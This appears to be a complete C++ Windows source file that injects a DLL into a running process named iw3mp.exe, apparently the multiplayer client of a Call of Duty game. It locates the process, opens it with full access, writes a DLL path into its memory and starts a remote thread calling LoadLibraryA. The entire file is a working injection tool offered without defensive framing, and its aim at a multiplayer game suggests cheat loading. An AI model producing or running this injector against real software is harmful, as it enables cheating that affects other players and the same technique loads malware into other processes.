#include <iostream>
#include <windows.h>
#include <tlhelp32.h>

// Function to find a process by its name and get its PID (Process ID)
DWORD GetProcessIdByName(const char* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (strcmp(processEntry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return processEntry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return 0;
}

int main() {
    const char* dllPath = "C:/Users/user/Desktop/test/t5/build/Debug/My32BitDll.dll"; // Path to the DLL you want to inject
    const char* processName = "iw3mp.exe"; // The name of the target process

    // Step 1: Find the target process by name and get its PID
    DWORD processId = GetProcessIdByName(processName);
    if (processId == 0) {
        std::cerr << "Could not find process " << processName << std::endl;
        return 1;
    }

    // Step 2: Open the target process with necessary permissions
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        std::cerr << "Failed to open target process" << std::endl;
        return 1;
    }

    // Step 3: Allocate memory in the target process for the DLL path
    LPVOID allocMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (allocMem == NULL) {
        std::cerr << "Failed to allocate memory in target process" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Step 4: Write the DLL path into the allocated memory
    if (!WriteProcessMemory(hProcess, allocMem, dllPath, strlen(dllPath) + 1, NULL)) {
        std::cerr << "Failed to write DLL path to target process memory" << std::endl;
        VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Step 5: Get the address of LoadLibraryA (which loads DLLs) from kernel32.dll
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddr == NULL) {
        std::cerr << "Failed to get LoadLibraryA address" << std::endl;
        VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Step 6: Create a remote thread in the target process to call LoadLibraryA with the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, allocMem, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Failed to create remote thread in target process" << std::endl;
        VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Wait for the thread to finish and clean up
    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    // std::cout << "DLL injected successfully!" << std::endl;
    // system("pause");
    return 0;
}
